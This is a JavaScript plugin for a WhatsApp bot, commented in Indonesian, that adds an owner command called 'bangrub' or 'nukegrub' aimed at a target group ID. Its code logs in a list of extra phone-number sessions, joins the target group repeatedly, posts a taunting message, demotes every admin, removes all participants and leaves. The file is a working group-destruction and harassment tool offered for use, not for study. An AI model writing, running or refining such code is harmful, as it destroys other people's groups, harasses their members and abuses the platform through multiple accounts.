/**
 * PLUGIN: BANGRUB V2
 * Fixed: require is not defined
 * Usage: .bangrub <group_id>
 */

// ─── FIX: IMPORT DI SINI, BUKAN REQUIRE DI DALAM ───
import makeWASocket, { useMultiFileAuthState, Browsers } from "ourin"

const pluginConfig = {
    name: 'bangrub',
    alias: ['nukegrub', 'bgv2'],
    category: 'owner',
    description: '💀 BanGrub V2 - Fixed',
    usage: '.bangrub <group_id>',
    example: '.bangrub 120363408544989663@g.us',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 120,
    energi: 20,
    isEnabled: true
}

// ═══════════════════════════════════════════════════════════════
// FUNGSI ASLI DARI USER (Hanya hapus baris require)
// ═══════════════════════════════════════════════════════════════
async function banGrubV2(sock, target) {
    const d = (ms) => new Promise(r => setTimeout(r, ms));
    
    const nums = [
        "628111111111","628222222222","628333333333","628444444444","628555555555",
        "628666666666","628777777777","628888888888","628999999999","628101010101",
        "14155551111","14155552222","447700900001","447700900002","819011111111"
    ];
    const teks = "GRUB LU AMPOS😹😹";
    let inviteCode = "";

    for (const num of nums) {
        try {
            const { state, saveCreds } = await useMultiFileAuthState("./ban_" + num);
            const fake = makeWASocket({
                auth: state,
                browser: Browsers.ubuntu("Chrome"),
                printQRInTerminal: false,
                syncFullHistory: false,
                markOnlineOnConnect: false
            });
            fake.ev.on("creds.update", saveCreds);
            await d(3000);

            if (!fake.authState.creds.registered) {
                console.log(num, "->", await fake.requestPairingCode(num));
                await d(15000);
            }

            await d(3000);

            try {
                inviteCode = await fake.groupInviteCode(target);
            } catch {
                if (!inviteCode) continue;
            }

            const bot = fake.user.id;

            for (let k = 0; k < 20; k++) {
                try {
                    await fake.groupAcceptInvite(inviteCode);
                    await d(300);
                    await fake.sendMessage(target, { text: teks });
                    await d(300);
                    
                    const meta = await fake.groupMetadata(target);
                    for (const p of meta.participants) {
                        if (p.id === bot) continue;
                        if (p.admin) {
                            try { await fake.groupParticipantsUpdate(target, [p.id], "demote"); } catch {}
                            await d(100);
                        }
                    }
                    for (const p of meta.participants) {
                        if (p.id === bot) continue;
                        try { await fake.groupParticipantsUpdate(target, [p.id], "remove"); } catch {}
                        await d(100);
                    }

                    await fake.groupLeave(target);
                    await d(300);
                } catch (e) {
                    await d(500);
                }
            }

            try { await fake.groupLeave(target); } catch {}
            try { fake.ws.close(); fake.end?.(); } catch {}
            console.log("[OK] " + num);
            await d(1000);

        } catch (e) {
            console.log("[ERR] " + num + ": " + (e.message || e));
            await d(1000);
        }
    }
}
// ═══════════════════════════════════════════════════════════════

// ─── HANDLER ──────────────────────────────────────────────────
async function handler(m, { sock }) {
    try {
        if (!sock) return m.reply('❌ Sock tidak tersedia!')

        const args = m.args || []
        const prefix = m.prefix || '.'
        const target = args[0]?.trim()

        if (!target) {
            return m.reply(
                `💀 *BANGRUB V2*\n\n` +
                `Usage: ${prefix}bangrub <group_id>\n` +
                `Example: ${prefix}bangrub 120363408544989663@g.us\n\n` +
                `⚠️ *WARNING:* Fungsi ini akan jalan di background.`
            )
        }

        if (!target.includes('@g.us')) {
            return m.reply(`❌ Target harus ID grup! (akhiran @g.us)`)
        }

        await m.react('⏳')
        await m.reply(`💀 *MEMULAI NUKER DI BACKGROUND...*\n\n📌 Target: ${target}\n\nCek console/log bot untuk melihat proses.`)

        // Jalankan fungsi asli lo tanpa di-await
        banGrubV2(sock, target).then(() => {
            console.log('[bangrub] Proses Nuker selesai.')
        }).catch((err) => {
            console.error('[bangrub] Error:', err.message)
        })

        await m.react('✅')
        return m.reply(`✅ *Perintah dieksekusi!*\nProses berjalan di background.`)

    } catch (error) {
        console.error('[bangrub]', error.message)
        await m.react('❌')
        return m.reply(`❌ Error: ${error.message.slice(0, 100)}`)
    }
}

export { pluginConfig as config, handler }